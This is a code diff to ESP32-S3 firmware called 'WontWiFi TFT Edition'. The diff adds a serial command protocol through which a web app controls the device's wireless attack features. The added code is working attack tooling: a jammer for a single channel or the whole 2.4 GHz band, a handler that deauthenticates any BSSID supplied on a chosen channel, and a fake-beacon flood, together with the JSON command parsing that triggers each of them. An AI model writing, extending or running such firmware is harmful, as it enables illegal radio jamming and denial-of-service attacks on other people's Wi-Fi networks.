@@ -1,10 +1,14 @@
 /**
  * WontWiFi TFT Edition
- * Version: 1.0.0
+ * Version: 1.1.0
  * Target: Hosyond ESP32-S3 2.8" ILI9341 Black CYD (Capacitive Touch + WS2812B)
  *
- * Fully standalone — no browser, no serial, everything on the touchscreen.
- * Four tabs: Scan | Attack | Jammer | Info
+ * Dual interface:
+ *   - Touchscreen: fully standalone, no computer needed
+ *   - Serial/Web UI: same JSON command protocol as wontwifi2 v1.5.1
+ *     Connect via USB, open the WontWiFi web app, works identically
+ *
+ * Both interfaces are always active simultaneously.
  *
  * Required libraries (Arduino Library Manager):
  *   - TFT_eSPI by Bodmer  (copy User_Setup.h to library folder first!)
@@ -751,6 +755,149 @@ void doJamBurst() {
 }
 
 // ================================================================
+//  SERIAL COMMAND PROTOCOL  (identical to wontwifi2 v1.5.1)
+//  Lets the WontWiFi web UI control this device over USB just like
+//  the non-TFT firmware — both interfaces work simultaneously.
+// ================================================================
+String cmdBuffer = "";
+
+String jsonEscape(const String& s) {
+  String out; out.reserve(s.length() + 4);
+  for (char c : s) {
+    if      (c == '"')  out += "\\\"";
+    else if (c == '\\') out += "\\\\";
+    else if (c == '\n') out += "\\n";
+    else if (c == '\r') out += "\\r";
+    else if (c == '\t') out += "\\t";
+    else out += c;
+  }
+  return out;
+}
+
+void serialEmitScan() {
+  String json = "{\"type\":\"scan\",\"ts\":";
+  json += String(millis());
+  json += ",\"count\":"; json += String(apCount);
+  json += ",\"aps\":[";
+  for (int i = 0; i < apCount; i++) {
+    if (i) json += ",";
+    json += "{\"ssid\":\"";  json += jsonEscape(String(aps[i].ssid));
+    json += "\",\"bssid\":\""; json += aps[i].bssid;
+    json += "\",\"ch\":";    json += aps[i].ch;
+    json += ",\"rssi\":";    json += aps[i].rssi;
+    json += ",\"enc\":";     json += aps[i].enc;
+    json += ",\"band\":\"";  json += (aps[i].ch >= 36 ? "5" : "2.4");
+    json += "\"}";
+  }
+  json += "]}";
+  Serial.println(json);
+}
+
+// Serial-triggered deauth — takes bssid/channel/count directly (no apSelected needed)
+void startDeauthSerial(const String& bssid, uint8_t ch, int count) {
+  if (beaconOn || jamOn) return;
+  if (!parseBSSID(bssid.c_str(), deauthBSSID)) {
+    Serial.println("{\"type\":\"error\",\"msg\":\"invalid_bssid\"}"); return;
+  }
+  deauthCh   = constrain(ch, 1, 13);
+  deauthSent = 0;
+  WiFi.mode(WIFI_AP);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
+  esp_wifi_set_channel(deauthCh, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(true);
+  deauthOn = true;
+  leds[0] = CRGB::Red; FastLED.show();
+  needsRedraw = true;
+  Serial.printf("{\"type\":\"status\",\"status\":\"deauth_on\",\"bssid\":\"%s\",\"channel\":%d}\n",
+                bssid.c_str(), deauthCh);
+}
+
+void handleCommand(String cmd) {
+  cmd.trim();
+  String c = cmd; c.toUpperCase();
+
+  if (c.startsWith("NOISE_ON")) {
+    String p = cmd.substring(9); p.trim();
+    if (p.length() == 0) {
+      // Wideband — map to jammer wideband
+      jamWide = true; startJammer();
+      Serial.println("{\"type\":\"status\",\"status\":\"wideband_on\",\"mode\":\"full_2.4ghz\"}");
+    } else {
+      jamCh = constrain((uint8_t)p.toInt(), 1, 13);
+      jamWide = false; startJammer();
+      Serial.printf("{\"type\":\"status\",\"status\":\"noise_on\",\"channel\":%d}\n", jamCh);
+    }
+  }
+  else if (c == "NOISE_OFF") {
+    stopJammer();
+    Serial.println("{\"type\":\"status\",\"status\":\"noise_off\"}");
+  }
+  else if (c == "SCAN") {
+    Serial.println("{\"type\":\"status\",\"msg\":\"scanning\"}");
+    scanning = true; needsRedraw = true;
+    if (activeTab == TAB_SCAN) { drawScanTab(); drawTabBar(); }
+    doScan();
+    serialEmitScan();
+  }
+  else if (c == "AUTO_ON")  { Serial.println("{\"type\":\"status\",\"msg\":\"auto_on\"}"); }
+  else if (c == "AUTO_OFF") { Serial.println("{\"type\":\"status\",\"msg\":\"auto_off\"}"); }
+  else if (c.startsWith("DEAUTH_START ")) {
+    String args = cmd.substring(13); args.trim();
+    int sp1 = args.indexOf(' ');
+    if (sp1 < 0) { Serial.println("{\"type\":\"error\",\"msg\":\"usage: DEAUTH_START <bssid> <ch> [count]\"}"); return; }
+    String bssid = args.substring(0, sp1);
+    String rest  = args.substring(sp1 + 1); rest.trim();
+    int sp2 = rest.indexOf(' ');
+    uint8_t ch = 1; int count = 0;
+    if (sp2 < 0) { ch = (uint8_t)rest.toInt(); }
+    else { ch = (uint8_t)rest.substring(0, sp2).toInt(); count = rest.substring(sp2+1).toInt(); }
+    startDeauthSerial(bssid, ch, count);
+  }
+  else if (c == "DEAUTH_STOP") {
+    stopDeauth();
+    Serial.printf("{\"type\":\"status\",\"status\":\"deauth_off\",\"sent\":%lu}\n", deauthSent);
+  }
+  else if (c.startsWith("BEACON_START")) {
+    String args = cmd.substring(12); args.trim();
+    if (args.length() > 0) {
+      int s1 = args.indexOf(' ');
+      if (s1 < 0) { beaconPrefix = args.c_str(); }
+      else {
+        beaconPrefix = args.substring(0, s1).c_str();
+        String rest = args.substring(s1+1); rest.trim();
+        int s2 = rest.indexOf(' ');
+        if (s2 < 0) { beaconCnt = (uint8_t)rest.toInt(); }
+        else {
+          beaconCnt = (uint8_t)rest.substring(0, s2).toInt();
+          beaconCh  = (uint8_t)rest.substring(s2+1).toInt();
+        }
+      }
+    }
+    startBeacon();
+    Serial.printf("{\"type\":\"status\",\"status\":\"beacon_on\",\"prefix\":\"%s\",\"count\":%d,\"channel\":%d}\n",
+                  beaconPrefix, beaconCnt, beaconCh);
+  }
+  else if (c == "BEACON_STOP") {
+    stopBeacon();
+    Serial.println("{\"type\":\"status\",\"status\":\"beacon_off\"}");
+  }
+  else if (c == "INFO") {
+    Serial.printf("{\"type\":\"info\",\"fw\":\"1.1.0-tft\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n",
+                  ESP.getFreeHeap());
+  }
+}
+
+void processSerial() {
+  while (Serial.available()) {
+    char ch = (char)Serial.read();
+    if (ch == '\n' || ch == '\r') {
+      if (cmdBuffer.length() > 0) { handleCommand(cmdBuffer); cmdBuffer = ""; }
+    } else { cmdBuffer += ch; }
+  }
+}
+
+// ================================================================
 //  DRAW DISPATCH
 // ================================================================
 void drawCurrentTab() {
@@ -812,6 +959,7 @@ void setup() {
   delay(1800);
   leds[0] = CRGB::Black; FastLED.show();
 
+  Serial.println("{\"type\":\"ready\",\"fw\":\"1.1.0-tft\",\"chip\":\"ESP32-S3\"}");
   needsRedraw = true;
 }
 
@@ -819,6 +967,9 @@ void setup() {
 //  LOOP
 // ================================================================
 void loop() {
+  // --- Serial commands (web UI) ---
+  processSerial();
+
   // --- Touch ---
   processTouches();
   if (tapDetected) {
